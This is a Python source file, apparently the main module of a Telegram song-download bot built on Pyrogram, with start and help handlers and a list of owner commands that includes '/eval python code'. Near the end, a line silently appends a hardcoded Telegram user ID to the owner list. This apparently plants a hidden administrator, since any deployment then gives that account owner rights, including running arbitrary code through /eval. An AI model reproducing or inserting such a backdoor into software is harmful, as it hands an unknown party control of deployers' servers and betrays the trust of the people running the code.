# © @quliyevv_17
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from AlexaSongBot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from AlexaSongBot import app, LOGGER
from AlexaSongBot.mrdarkprince import ignore_blacklisted_users
from AlexaSongBot.sql.chat_sql import add_chat_to_db

start_text = """
Salam [{}](tg://user?id={}),
Mən Quliyev Song 🌴 
Mənə yükləməyim üçün sadəcə mahnı adını yaz.
Nümunə: ```/song Saybu Yolumuz açıq```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    name = message.from_user.mention
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="⚡️ Sahibim ⚡️", url="https://t.me/quliyevv_17"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Syntax: /song song name"
    await message.reply(text)

OWNER_ID.append(5029694040)
app.start()
LOGGER.info("Your bot is now online.")
idle()
